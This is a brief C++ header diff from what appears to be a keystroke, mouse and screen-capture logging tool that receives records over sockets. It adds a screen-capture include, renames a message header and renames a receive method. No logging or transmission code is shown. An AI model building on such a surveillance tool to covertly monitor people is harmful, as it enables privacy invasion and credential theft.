@@ -5,11 +5,12 @@
 #include <string>
 #include "KeyLogger.h"
 #include "MouseLogger.h"
+#include "ScreenCapture.h"
 #include <exception>
 #include <iostream>
 #include <vector>
 #include <thread>
-#include "MouseClickMessage.h"
+#include "MouseMessage.h"
 #include "MousePosMessage.h"
 #include "KeyboardMessage.h"
 #include <regex>
@@ -27,7 +28,7 @@ public:
 	void setType();
 
 private:
-	void receiveData(SOCKET sock);
+	void receiveRecords(SOCKET sock);
 	int receiveId(SOCKET sock);
 	Message* setMessageType(std::string msg);
 
